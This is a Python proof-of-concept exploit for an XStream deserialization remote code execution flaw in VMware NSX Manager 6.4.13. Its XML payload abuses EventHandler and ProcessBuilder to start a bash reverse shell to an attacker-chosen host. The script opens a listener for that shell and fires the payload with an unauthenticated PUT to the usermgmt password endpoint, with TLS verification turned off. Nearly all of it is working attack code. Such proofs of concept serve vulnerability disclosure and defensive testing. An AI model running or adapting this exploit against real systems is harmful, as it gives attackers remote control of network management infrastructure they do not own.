#!/usr/bin/env python3
"""
VMWare NSX Manager XStream Deserialization of Untrusted Data Remote Code Execution Vulnerability
Version: 6.4.13-19307994
File: VMware-NSX-Manager-6.4.13-19307994-disk1.vmdk
SHA1: f828eccd50d5f32500fb1f7a989d02bddf705c45
Found by: Sina Kheirkhah of MDSec and Steven Seeley of Source Incite
"""

import socket
import sys
import requests
from telnetlib import Telnet
from threading import Thread
from urllib3 import disable_warnings, exceptions
disable_warnings(exceptions.InsecureRequestWarning)

xstream = """
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>bash</string>
                    <string>-c</string>
                    <string>bash -i &#x3e;&#x26; /dev/tcp/{rhost}/{rport} 0&#x3e;&#x26;1</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

def handler(lp):
    print(f"(+) starting handler on port {lp}")
    t = Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"(+) connection from {addr[0]}")
    t.sock = conn
    print("(+) pop thy shell!")
    t.interact()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"(+) usage: {sys.argv[0]} <target> <connectback:port>")
        print(f"(+) eg: {sys.argv[0]} 192.168.18.135 172.18.182.204:1234")
        sys.exit(1)
    target = sys.argv[1]
    rhost  = sys.argv[2]
    rport  = 1234
    if ":" in sys.argv[2]:
        assert sys.argv[2].split(":")[1].isdigit(), "(-) didnt supply a valid port"
        rport = int(sys.argv[2].split(":")[1])
        rhost = sys.argv[2].split(":")[0]
    handlerthr = Thread(target=handler, args=[rport])
    handlerthr.start()
    # trigger rce
    requests.put(
        f"https://{target}/api/2.0/services/usermgmt/password/1337", 
        data=xstream.format(rhost=rhost, rport=rport), 
        headers={
            'Content-Type': 'application/xml'
        }, 
        verify=False
    )
